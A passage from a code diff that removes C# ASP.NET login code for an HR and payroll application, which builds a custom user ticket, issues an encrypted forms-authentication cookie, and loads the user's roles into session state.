-        }
-        catch
-        {
-            isEssEditPermission = false;
-        }
-
-        string basicTicket = ShampanIdentity.CreateBasicTicket(
-            user.LogID ?? "",
-            (user.FullName ?? "").Trim(),
-            company.Id.ToString(),
-            (company.Name ?? "").Trim(),
-            branch.Id.ToString(),
-            (branch.Name ?? "").Trim(),
-            Convert.ToString(controller.Session["TempComputerIPAddress"]) ?? "",
-            "symphony.com",
-            "BDT",
-            Convert.ToDateTime(GetSessionDate(controller)).ToString("yyyyMMdd"),
-            "HRM",
-            (user.EmployeeId ?? "").Trim(),
-            (user.EmployeeCode ?? "").Trim(),
-            (user.Id ?? "").Trim(),
-            user.IsAdmin,
-            user.IsESS,
-            user.IsHRM,
-            user.IsAttenance,
-            user.IsPayroll,
-            user.IsTAX,
-            user.IsPF,
-            user.IsGF,
-            Convert.ToString(controller.Session["TempLocation"]) ?? "",
-            false,
-            false,
-            false,
-            false,
-            false,
-            false,
-            false,
-            user.IsApprove,
-            false,
-            false,
-            false,
-            false,
-            false,
-            false,
-            false,
-            isEssEditPermission
-        );
-
-        int timeOut;
-        if (!int.TryParse(ReadSetting(new AppSettingsReader(), "COOKIE_TIMEOUT"), out timeOut))
-        {
-            timeOut = 100;
-        }
-
-        FormsAuthenticationTicket authTicket = new FormsAuthenticationTicket(
-            1,
-            FormsAuthentication.FormsCookieName,
-            DateTime.Now,
-            DateTime.Now.AddMinutes(timeOut),
-            true,
-            basicTicket);
-
-        string encryptedTicket = FormsAuthentication.Encrypt(authTicket);
-        string companyName = ReadSetting(new AppSettingsReader(), "CompanyName");
-
-        controller.HttpContext.Response.Cookies.Add(new HttpCookie(companyName, encryptedTicket));
-        controller.HttpContext.Application["BasicTicket" + user.LogID] = basicTicket;
-        controller.HttpContext.Application["RoleTicket" + user.LogID] = roleTicket;
-
-        DataTable sessionRoles = new SymUserRoleRepo().RollByUserId(user.Id);
-        string sessionRoleKey = user.Id + "-SymRoll";
-        if (controller.Session[sessionRoleKey] != null)
-        {
-            controller.Session.Remove(sessionRoleKey);
-        }
-
-        controller.Session.Add(sessionRoleKey, sessionRoles);
-
-        var identity = new ShampanIdentity(basicTicket);
-        identity.SetRoles(roleTicket);
-        var principal = new ShampanPrincipal(identity);
-
-        controller.HttpContext.User = principal;
-        Thread.CurrentPrincipal = principal;
-    }
-
-    private static string GetSessionDate(Controller controller)
-    {
-        string sessionDate = Convert.ToString(controller.Session["TempSessionDate"]);
-        if (string.IsNullOrWhiteSpace(sessionDate))
-        {
-            sessionDate = DateTime.Now.ToString("dd-MMM-yyyy");
-        }
-
-        return sessionDate;
-    }
-
-    private static string ReadSetting(AppSettingsReader settings, string key)
-    {
-        try
-        {
-            return Convert.ToString(settings.GetValue(key, typeof(string))) ?? "";
-        }
-        catch
-        {
-            return "";
-        }
     }
 }
